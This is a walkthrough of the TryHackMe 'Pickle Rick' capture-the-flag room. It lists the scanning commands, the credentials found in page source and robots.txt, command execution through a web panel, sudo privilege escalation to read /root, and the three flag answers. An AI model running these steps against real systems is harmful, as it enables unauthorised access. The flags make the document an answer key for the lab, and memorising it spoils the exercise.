# Pickle-Rick-CTF-
https://tryhackme.com/room/picklerick

###### Use Nmap to find out open ports : sudo nmap -sS -sV  10.10.181.209

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))


Found a username by inspecting the webpage :

Username: R1ckRul3s

###### use gobuster dir -u http: //10.10.181.209 -w /usr/share/wordlists/dirb/common.txt and found the following:

/assets               (Status: 301) [Size: 315] [--> http://10.10.181.209/assets/]

/index.html           (Status: 200) [Size: 1062]  
                                
/robots.txt           (Status: 200) [Size: 17] 
                                   
/server-status        (Status: 403) [Size: 301] 
 
Found this text "Wubbalubbadubdub" on the robots.txt file 

###### use nikto -h http: //10.10.181.209 to find more clues

enter the username and roboto.txt text to gain access : found a /login.php directory 

###### try the linx ls commands and the following were found

Sup3rS3cretPickl3Ingred.txt

assets

clue.txt

denied.php

index.html

login.php

portal.php

robots.txt

###### unable to use cat though , try using strings 

use strings Sup3rS3cretPickl3Ingred.txt to get the first flag

clue.txt gives us some info : Look around the file system for the other ingredient.

ls /home/ and rick user is found 

ls /home/rick to see another file vall second ingredients 

strings /home/rick/"second ingredients" to find the 2nd flag

try gaining root access , sudo -l : (ALL) NOPASSWD: ALL

use sudo ls /root/ to find the following files

3rd.txt 

snap 

sudo strings /root/3rd.txt to find the final flag 

## What is the first ingredient Rick needs?

🏴‍☠️mr. meeseek hair

## Whats the second ingredient Rick needs?

🏴‍☠️1 jerry tear

## Whats the final ingredient Rick needs?

🏴‍☠️fleeb juice

